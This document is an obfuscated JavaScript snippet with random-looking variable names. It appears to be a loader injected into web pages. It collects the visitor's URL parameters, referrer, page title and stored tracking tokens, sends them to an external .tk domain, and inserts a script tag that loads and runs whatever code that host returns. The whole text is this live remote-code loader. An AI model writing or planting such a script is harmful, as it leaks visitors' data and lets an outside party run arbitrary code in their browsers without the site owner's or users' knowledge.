    (function() {
    var name = '_4X6VB2zNv7TvJWvp';
    if (!window._4X6VB2zNv7TvJWvp) {
        window._4X6VB2zNv7TvJWvp = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://snelaslatemlauvo.tk/paso',
            P_PATH: 'https://snelaslatemlauvo.tk/fec84ce/postback',
        };
    }
    const _fYh4SRTYsPJhZFZ9 = localStorage.getItem('config');
    if (typeof _fYh4SRTYsPJhZFZ9 !== 'undefined' && _fYh4SRTYsPJhZFZ9 !== null) {
        var _TK7fHtvvdYvsd79z = JSON.parse(_fYh4SRTYsPJhZFZ9);
        var _7gCZ1t9YTxLWThw4 = Math.round(+new Date()/1000);
        if (_TK7fHtvvdYvsd79z.created_at + window._4X6VB2zNv7TvJWvp.ttl < _7gCZ1t9YTxLWThw4) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _J6mCRBD1nV1cxKmf = localStorage.getItem('subId');
    var _bY3wTM4Y4LxCpCJ9 = localStorage.getItem('token');
    var _jtxsH3BNXpj2385H = '?return=js.client';
        _jtxsH3BNXpj2385H += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _jtxsH3BNXpj2385H += '&se_referrer=' + encodeURIComponent(document.referrer);
        _jtxsH3BNXpj2385H += '&default_keyword=' + encodeURIComponent(document.title);
        _jtxsH3BNXpj2385H += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _jtxsH3BNXpj2385H += '&name=' + encodeURIComponent(name);
        _jtxsH3BNXpj2385H += '&host=' + encodeURIComponent(window._4X6VB2zNv7TvJWvp.R_PATH);
    if (typeof _J6mCRBD1nV1cxKmf !== 'undefined' && _J6mCRBD1nV1cxKmf && window._4X6VB2zNv7TvJWvp.unique) {
        _jtxsH3BNXpj2385H += '&sub_id=' + encodeURIComponent(_J6mCRBD1nV1cxKmf);
    }
    if (typeof _bY3wTM4Y4LxCpCJ9 !== 'undefined' && _bY3wTM4Y4LxCpCJ9 && window._4X6VB2zNv7TvJWvp.unique) {
        _jtxsH3BNXpj2385H += '&token=' + encodeURIComponent(_bY3wTM4Y4LxCpCJ9);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._4X6VB2zNv7TvJWvp.R_PATH + _jtxsH3BNXpj2385H;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
